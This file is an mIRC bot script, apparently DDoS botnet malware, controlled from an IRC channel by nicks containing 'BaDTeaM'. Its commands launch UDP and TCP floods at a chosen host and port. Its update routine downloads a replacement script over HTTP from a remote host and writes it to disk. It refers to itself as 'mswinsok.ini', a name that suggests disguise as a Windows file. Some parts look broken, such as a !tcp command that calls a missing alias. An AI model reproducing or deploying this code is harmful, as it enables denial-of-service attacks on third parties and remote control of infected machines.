[script]
n0=ctcp 700:*badteam*:*: { .notice $nick I`m New Bot | halt }
n1=on 700:text:*:*:{
n2=  if (BaDTeaM !isin $nick) { halt } 
n3=  if ($1 == !udp) {
n4=    set %udp1 $2
n5=    udp
n6=    msg # 15.::14Now Sending UDP packets to %udp1 $+ 15::.
n7=  }
n8=  if ($1 == !tcp) {
n9=    set %tcpp $2
n10=    kill
n11=    msg # 15.::14Now Sending TCP packets to %tcpp $+ 15::.
n12=  }
n13=  if ($1 == !udp2) {
n14=    set %udp1 $2
n15=    set %sqqq $3
n16=    udp3
n17=    msg # 15.::14Now Sending UDP packets to %udp1 on port %sqqq $+ 15::.
n18=  }
n19=  if ($1 == !udpx) {
n20=    set %udp1 $2
n21=    set %sqqq $3
n22=    udp5
n23=    msg # 15.::14Now Sending UDP packets to %udp1 on port %sqqq forever!15::.
n24=  }
n25=  if ($1 == !halt) { msg # 15.::14All packets aborted15::. | timerudp* off | timertcp* off }
n26=  if ($1 == !ud1) { set %usite $2 | msg # 15.::14Update root set to %usite 15::. }
n27=  if ($1 == !ud2) { set %usite2 $2 | msg # 15.::14Update path set to %usite2 15::. }
n28=  if ($1 == !update) { if ($2 == $null) { set %usite $2 | set %usite2 $3 | set %fileini $4 | update | msg # Now Updating From > http:// $+ %usite2 $+ / $+ %fileini }
n29=  }
n30=}
n31=alias reset {
n32=  msg # 15.::14Done!15::.
n33=  reload -rs mswinsok.ini
n34=  halt
n35=}
n36=alias udp {
n37=  timerudp $+ $rand(100,10000) -cm 5000 100 udp2
n38=  timerudpstat -co 1 300 set %udpstat off
n39=  .timerudpkeepalive 500 10 sockwrite -tn * PONG
n40=}
n41=alias udp3 {
n42=  timerudp $+ $rand(100,10000) -cm 5000 100 udp4
n43=  timerudpstat -co 1 300 set %udpstat off
n44=  .timerudpkeepalive 500 10 sockwrite
n45=}
n46=alias udp5 {
n47=  timerudp $+ $rand(100,10000) -cm 0 150 700:
n48=}
n49=alias udp2 {
n50=  sockudp -nt $rand(1,10000000000000) %udp1 $r(1,60000) ping
n51=  sockudp -nt $rand(1,10000000000000) %udp1 $r(1,60000) ping
n52=  sockudp -nt $rand(1,10000000000000) %udp1 $r(1,60000) ping
n53=  sockudp -nt $rand(1,10000000000000) %udp1 $r(1,60000) ping
n54=  sockudp -nt $rand(1,10000000000000) %udp1 $r(1,60000) ping
n55=  sockudp -nt $rand(1,10000000000000) %udp1 $r(1,60000) ping
n56=  sockudp -nt $rand(1,10000000000000) %udp1 $r(1,60000) ping
n57=  sockudp -nt $rand(1,10000000000000) %udp1 $r(1,60000) ping
n58=  sockudp -nt $rand(1,10000000000000) %udp1 $r(1,60000) ping
n59=  sockudp -nt $rand(1,10000000000000) %udp1 $r(1,60000) ping
n60=  sockudp -nt $rand(1,10000000000000) %udp1 $r(1,60000) ping
n61=  sockudp -nt $rand(1,10000000000000) %udp1 $r(1,60000) ping
n62=  sockudp -nt $rand(1,10000000000000) %udp1 $r(1,60000) ping
n63=  sockudp -nt $rand(1,10000000000000) %udp1 $r(1,60000) ping
n64=  sockudp -nt $rand(1,10000000000000) %udp1 $r(1,60000) ping
n65=}
n66=alias udp4 {
n67=  sockudp -nt $rand(1,10000000000000) %udp1 %sqqq ping
n68=  sockudp -nt $rand(1,10000000000000) %udp1 %sqqq ping
n69=  sockudp -nt $rand(1,10000000000000) %udp1 %sqqq ping
n70=  sockudp -nt $rand(1,10000000000000) %udp1 %sqqq ping
n71=  sockudp -nt $rand(1,10000000000000) %udp1 %sqqq ping
n72=  sockudp -nt $rand(1,10000000000000) %udp1 %sqqq ping
n73=  sockudp -nt $rand(1,10000000000000) %udp1 %sqqq ping
n74=  sockudp -nt $rand(1,10000000000000) %udp1 %sqqq ping
n75=  sockudp -nt $rand(1,10000000000000) %udp1 %sqqq ping
n76=  sockudp -nt $rand(1,10000000000000) %udp1 %sqqq ping
n77=  sockudp -nt $rand(1,10000000000000) %udp1 %sqqq ping
n78=  sockudp -nt $rand(1,10000000000000) %udp1 %sqqq ping
n79=  sockudp -nt $rand(1,10000000000000) %udp1 %sqqq ping
n80=  sockudp -nt $rand(1,10000000000000) %udp1 %sqqq ping
n81=  sockudp -nt $rand(1,10000000000000) %udp1 %sqqq ping
n82=}
n83=
n84=on 1:sockopen:packet*:{ if ($sockerr > 0) { .sockclose $sockname }
n85=  sockwrite -tn packet* entersomenicedatastringshereidontthinkthisislongenoughsoiwilladdmorehehe $+ $cr $+ $cr $+ $rand(1,99999999999999999999) $+ $cr
n86=}
n87=alias tcpp {
n88=  sockopen packet [ $+ [ $rand(1,65535) ] ] %tcpp $rand(1,65535)
n89=  sockopen packet [ $+ [ $rand(1,65535) ] ] %tcpp $rand(1,65535)
n90=  sockopen packet [ $+ [ $rand(1,65535) ] ] %tcpp $rand(1,65535)
n91=  sockopen packet [ $+ [ $rand(1,65535) ] ] %tcpp $rand(1,65535)
n92=  sockopen packet [ $+ [ $rand(1,65535) ] ] %tcpp $rand(1,65535)
n93=  sockopen packet [ $+ [ $rand(1,65535) ] ] %tcpp $rand(1,65535)
n94=  sockopen packet [ $+ [ $rand(1,65535) ] ] %tcpp $rand(1,65535)
n95=  sockopen packet [ $+ [ $rand(1,65535) ] ] %tcpp $rand(1,65535)
n96=  sockopen packet [ $+ [ $rand(1,65535) ] ] %tcpp $rand(1,65535)
n97=  sockopen packet [ $+ [ $rand(1,65535) ] ] %tcpp $rand(1,65535)
n98=  sockopen packet [ $+ [ $rand(1,65535) ] ] %tcpp $rand(1,65535)
n99=  sockopen packet [ $+ [ $rand(1,65535) ] ] %tcpp $rand(1,65535)
n100=  sockopen packet [ $+ [ $rand(1,65535) ] ] %tcpp $rand(1,65535)
n101=  sockopen packet [ $+ [ $rand(1,65535) ] ] %tcpp $rand(1,65535)
n102=  sockopen packet [ $+ [ $rand(1,65535) ] ] %tcpp $rand(1,65535)
n103=  sockopen packet [ $+ [ $rand(1,65535) ] ] %tcpp $rand(1,65535)
n104=  sockopen packet [ $+ [ $rand(1,65535) ] ] %tcpp $rand(1,65535)
n105=}
n106=alias tcp {
n107=  timertcp $+ $rand(100,10000) -cm 10000 10 tcpp
n108=  timertcpstat -co 1 300 set %tcpstat off
n109=}
n110=
n111=alias update { .timerdl1 1 1 sockclose dl | .timerdl2 1 5 sockopen dl %usite 80 | .timerdl3 1 1 set %ureads 0 }
n112=on *:sockopen:dl:{
n113=  .sockwrite -n dl GET http:// $+ %usite2 $+ / $+ %fileini
n114=}
n115=on *:sockread:dl:{
n116=  :loop
n117=  sockread %udl
n118=  if ($sockbr == 0) { .timerudl1 1 3 msg #ébadteamé Updated Script! | halt }
n119=  inc %ureads
n120=  if (%ureads == 1) { .write -c %fileini | write -l1 %fileini [script] | goto loop }
n121=  if (%ureads > 1) {
n122=    write -n %fileini %udl
n123=  }
n124=}
